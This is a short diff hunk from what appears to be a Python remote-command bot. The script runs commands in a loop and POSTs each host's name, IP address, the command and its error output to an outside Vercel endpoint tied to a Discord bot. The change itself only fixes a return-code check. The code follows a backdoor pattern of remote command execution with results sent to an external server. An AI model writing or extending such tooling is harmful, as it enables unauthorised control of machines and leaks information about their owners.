@@ -105,7 +105,7 @@ while True:
                                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Error: {cmderr.decode()} exited with code {r.returncode}```- {ip}@{hostname}")
                             else:
                                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: {cmderr.decode()} exited with code {r.returncode}```- {ip}@{hostname}")
-                    elif r.returncode == 0 and cmdout.decode() == "":
+                    elif r.returncode != 0 and cmdout.decode() == "":
                         post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: exited with no output and code {r.returncode}```- {ip}@{hostname}")
                 except KeyboardInterrupt:
                     try:
